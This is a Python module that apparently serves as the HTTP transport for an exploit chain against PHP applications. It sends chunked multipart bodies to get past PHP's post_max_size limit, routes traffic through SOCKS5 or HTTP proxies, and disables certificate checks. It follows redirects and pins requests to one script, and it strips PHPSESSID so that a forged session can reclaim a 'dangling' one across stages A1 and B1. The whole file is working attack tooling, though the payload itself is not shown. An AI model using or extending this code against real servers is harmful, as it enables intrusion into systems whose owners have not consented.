"""HTTP transport for multipart payloads.

Provides chunked and plain HTTP POST senders. The chunked sender bypasses
PHP's post_max_size check: without Content-Length, SG(request_info).content_length
stays 0 and rfc1867_post_handler skips its size check. The multipart parser reads
the dechunked body directly.

Supports HTTP/HTTPS, proxy tunneling (SOCKS5/HTTP), connection reuse,
and configurable timeouts with retry logic.
"""
from __future__ import annotations

import socket
import ssl
import struct
import time
from dataclasses import dataclass


DEFAULT_BOUNDARY = "C" * 10
MAX_RESPONSE = 4 << 20  # 4 MB


@dataclass
class TransportConfig:
    host: str = "127.0.0.1"
    port: int = 80
    tls: bool = False
    proxy: str = ""  # socks5://host:port or http://host:port
    cookie: str = ""      # accumulated Cookie header value
    redirects: int = 5    # max 3xx hops when resolving the entry point
    last_path: str = ""   # final path after redirects (set by _raw_send)
    pin_path: str = ""    # once set, every request is sent here
    follow_redirects: bool = True
    inject_cookie: bool = False  # only while resolving the entry point
    timeout: float = 120.0
    retries: int = 1
    retry_delay: float = 0.5


def _connect(cfg: TransportConfig) -> socket.socket:
    """Establish a TCP connection, optionally through a proxy."""
    if cfg.proxy:
        if cfg.proxy.startswith("socks5://"):
            return _socks5_connect(cfg)
        elif cfg.proxy.startswith("http://"):
            return _http_proxy_connect(cfg)
        else:
            raise ValueError(f"unsupported proxy scheme: {cfg.proxy}")

    s = socket.create_connection((cfg.host, cfg.port), timeout=cfg.timeout)
    s.settimeout(cfg.timeout)

    if cfg.tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=cfg.host)

    return s


def _socks5_connect(cfg: TransportConfig) -> socket.socket:
    """Connect through a SOCKS5 proxy."""
    proxy_url = cfg.proxy.replace("socks5://", "")
    proxy_host, proxy_port_str = proxy_url.rsplit(":", 1)
    proxy_port = int(proxy_port_str)

    s = socket.create_connection((proxy_host, proxy_port), timeout=cfg.timeout)
    s.settimeout(cfg.timeout)

    # SOCKS5 handshake: no auth
    s.sendall(b"\x05\x01\x00")
    resp = s.recv(2)
    if resp != b"\x05\x00":
        s.close()
        raise ConnectionError("SOCKS5 handshake failed")

    # SOCKS5 connect request
    addr = cfg.host.encode()
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(addr)]) + addr +
              struct.pack("!H", cfg.port))
    resp = s.recv(10)
    if len(resp) < 2 or resp[1] != 0:
        s.close()
        raise ConnectionError(f"SOCKS5 connect failed: status {resp[1] if len(resp) > 1 else 'unknown'}")

    if cfg.tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=cfg.host)

    return s


def _http_proxy_connect(cfg: TransportConfig) -> socket.socket:
    """Connect through an HTTP CONNECT proxy."""
    proxy_url = cfg.proxy.replace("http://", "")
    proxy_host, proxy_port_str = proxy_url.rsplit(":", 1)
    proxy_port = int(proxy_port_str)

    s = socket.create_connection((proxy_host, proxy_port), timeout=cfg.timeout)
    s.settimeout(cfg.timeout)

    connect_req = (
        f"CONNECT {cfg.host}:{cfg.port} HTTP/1.1\r\n"
        f"Host: {cfg.host}:{cfg.port}\r\n\r\n"
    ).encode()
    s.sendall(connect_req)

    resp = b""
    while b"\r\n\r\n" not in resp:
        resp += s.recv(4096)
    if b"200" not in resp.split(b"\r\n")[0]:
        s.close()
        raise ConnectionError(f"HTTP CONNECT failed: {resp.split(b'\\r\\n')[0]}")

    if cfg.tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=cfg.host)

    return s


def _status_of(resp: bytes) -> int:
    """Parse the status code from a raw HTTP response."""
    try:
        line = resp.split(b"\r\n", 1)[0]
        parts = line.split(b" ")
        if len(parts) >= 2:
            return int(parts[1])
    except (ValueError, IndexError):
        pass
    return 0


def _header_of(resp: bytes, name: str) -> str:
    """First value of a response header, case-insensitive."""
    want = name.lower().encode() + b":"
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(want):
            return line.split(b":", 1)[1].strip().decode("latin1")
    return ""


def _absorb_cookies(cfg: "TransportConfig", resp: bytes) -> None:
    """Merge Set-Cookie pairs into cfg.cookie."""
    jar = {}
    for k, v in _iter_pairs(cfg.cookie):
        jar[k] = v
    for line in resp.split(b"\r\n"):
        if not line.lower().startswith(b"set-cookie:"):
            continue
        raw = line.split(b":", 1)[1].strip().decode("latin1")
        pair = raw.split(";", 1)[0]
        if "=" in pair:
            k, v = pair.split("=", 1)
            jar[k.strip()] = v.strip()
    cfg.cookie = "; ".join(f"{k}={v}" for k, v in jar.items())


def _iter_pairs(cookie: str):
    for part in (cookie or "").split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            yield k.strip(), v.strip()


def _resolve_location(base_path: str, location: str, cfg: "TransportConfig"):
    """Return (path, tls) for a redirect target.

    Handles absolute URLs, scheme-relative URLs, and plain paths.
    """
    import urllib.parse as _up

    if location.startswith("http://") or location.startswith("https://"):
        u = _up.urlparse(location)
        new_tls = (u.scheme == "https")
        return (u.path or "/") + (("?" + u.query) if u.query else ""), new_tls

    if location.startswith("//"):
        u = _up.urlparse("https:" + location)
        return (u.path or "/") + (("?" + u.query) if u.query else ""), cfg.tls

    if location.startswith("/"):
        return location, cfg.tls

    # relative to current path
    base_dir = base_path.rsplit("/", 1)[0]
    return base_dir + "/" + location, cfg.tls


def _rewrite_target(data: bytes, path: str) -> bytes:
    """Replace the request target on the first line."""
    head, sep, rest = data.partition(b"\r\n")
    parts = head.split(b" ")
    if len(parts) >= 2:
        head = parts[0] + b" " + path.encode() + b" HTTP/1.1"
    return head + sep + rest


def _send_once(cfg: TransportConfig, data: bytes) -> bytes:
    """One request/response exchange. Injects the cookie jar if absent."""
    # Only the entry-point resolver opts in. The chain stages set their own
    # Cookie headers; adding one here changes the leak window and breaks B1.
    if cfg.inject_cookie and cfg.cookie:
        head, sep, rest = data.partition(b"\r\n\r\n")
        if b"cookie:" not in head.lower():
            head += b"\r\nCookie: " + cfg.cookie.encode()
        data = head + sep + rest

    last_error = None
    for attempt in range(cfg.retries):
        try:
            s = _connect(cfg)
            resp = bytearray()
            try:
                s.sendall(data)
                while len(resp) < MAX_RESPONSE:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    resp.extend(chunk)
            except OSError:
                pass
            finally:
                s.close()
            return bytes(resp)
        except OSError as e:
            last_error = e
            if attempt < cfg.retries - 1:
                time.sleep(cfg.retry_delay)

    return b""


def _raw_send(cfg: TransportConfig, data: bytes, path: str = "") -> bytes:
    """Send, absorbing cookies and following redirects.

    A 301/302/303 downgrades to GET without a body: re-posting a 12MB
    multipart body to a login redirect is pointless and noisy.
    A 307/308 keeps method and body.
    cfg.last_path always reports where the exchange actually ended up.
    """
    # Pinned: the entry point was already resolved once. Send here, and do
    # not follow further hops - the chain needs every stage on the same
    # script so the dangling session is the one being reclaimed.
    if cfg.pin_path:
        cfg.last_path = cfg.pin_path
        return _send_once(cfg, _rewrite_target(data, cfg.pin_path))

    current = path or "/"
    hops = 0
    body_request = data

    while True:
        cfg.last_path = current
        resp = _send_once(cfg, _rewrite_target(body_request, current))
        if not resp:
            return b""

        _absorb_cookies(cfg, resp)

        code = _status_of(resp)
        if code not in (301, 302, 303, 307, 308) or hops >= cfg.redirects:
            return resp

        loc = _header_of(resp, "Location")
        if not loc:
            return resp

        new_path, new_tls = _resolve_location(current, loc, cfg)
        if new_tls != cfg.tls:
            cfg.tls = new_tls
        hops += 1
        current = new_path
        # First hop seen at runtime: remember it so later stages go straight
        # to the script that actually answers.
        if hops == 1:
            cfg.pin_path = new_path

        if code in (301, 302, 303):
            # Keep a body-carrying request as POST: the exploit payload must
            # reach the script intact. Only body-less probes become GET.
            has_body = b"\r\n\r\n" in body_request and \
                       len(body_request.split(b"\r\n\r\n", 1)[1]) > 0
            if not has_body:
                body_request = (
                    f"GET {current} HTTP/1.1\r\n"
                    f"Host: {cfg.host}:{cfg.port}\r\n"
                    f"Connection: close\r\n\r\n"
                ).encode()

        # Redirect chain finished without another hop: this is the answer.
        return resp




def send_chunked(cfg: TransportConfig, path: str, body: bytes,
                 boundary: str = DEFAULT_BOUNDARY,
                 chunk_size: int = 65536) -> bytes:
    """Send a multipart body with chunked transfer-encoding.

    Bypasses post_max_size because without Content-Length, PHP's multipart
    parser reads the dechunked body directly, skipping the size check.
    Tested: 10MB+ bodies parsed normally despite post_max_size=8M.
    """
    header = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {cfg.host}:{cfg.port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    wire = bytearray(header)
    for i in range(0, len(body), chunk_size):
        piece = body[i:i + chunk_size]
        wire += f"{len(piece):x}\r\n".encode() + piece + b"\r\n"
    wire += b"0\r\n\r\n"

    return _raw_send(cfg, bytes(wire), path)


def send_plain(cfg: TransportConfig, path: str, body: bytes,
               boundary: str = DEFAULT_BOUNDARY) -> bytes:
    """Send a multipart body with Content-Length (standard POST)."""
    header = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {cfg.host}:{cfg.port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    return _raw_send(cfg, header + body, path)


def resolve_entry(cfg: TransportConfig, path: str, verbose: bool = False) -> str:
    """Follow redirects once and pin the chain to the final path.

    Returns the path every later request should use. Safe to call on a
    non-redirecting target: it just returns `path` unchanged.
    """
    if not cfg.follow_redirects:
        return path

    cfg.pin_path = ""          # allow the resolution itself to follow
    cfg.inject_cookie = True   # send absorbed cookies back while probing
    saved_cookie = cfg.cookie
    try:
        send_get(cfg, path)
    finally:
        cfg.inject_cookie = False
    final = cfg.last_path or path
    cfg.pin_path = final

    # Keep any cookie the redirect chain required, but drop the app's session
    # id: the exploit forges its own, and a leftover PHPSESSID makes A1 dangle
    # a session that B1 never reclaims.
    kept = [pair for pair in (cfg.cookie or "").split(";")
            if pair.strip() and not pair.strip().upper().startswith("PHPSESSID=")]
    cfg.cookie = "; ".join(pair.strip() for pair in kept) or saved_cookie

    if verbose and final != path:
        print(f"  [redirect] {path} -> {final}")
    return final


def send_get(cfg: TransportConfig, path: str) -> bytes:
    """Send a simple GET request."""
    req = (
        f"GET {path} HTTP/1.0\r\n"
        f"Host: {cfg.host}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    return _raw_send(cfg, req, path)


def get_status_line(resp: bytes) -> str:
    """Extract the HTTP status line from a raw response."""
    if not resp:
        return ""
    return resp.split(b"\r\n", 1)[0][:60].decode("latin1", "replace")


def get_status_code(resp: bytes) -> int:
    """Extract the HTTP status code from a raw response."""
    line = get_status_line(resp)
    parts = line.split()
    if len(parts) >= 2 and parts[1].isdigit():
        return int(parts[1])
    return 0
